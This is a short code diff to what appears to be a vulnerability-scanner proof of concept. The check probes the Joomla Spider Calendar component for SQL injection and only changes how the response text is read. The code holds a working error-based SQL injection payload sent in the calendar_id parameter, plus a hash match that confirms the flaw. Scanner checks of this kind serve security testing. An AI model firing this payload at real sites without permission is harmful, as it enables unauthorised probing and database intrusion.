@@ -49,7 +49,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             payload = '||exp(~(select*from(select md5(456546))a))'
             vul_url = arg + '/index.php?option=com_spidercalendar&view=spidercalendar&calendar_id=1'
-            response = requests.get(vul_url+payload).content
+            response = requests.get(vul_url+payload).text
             if 'e02f052b7d3db73f99d4f5801f2b6fff' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
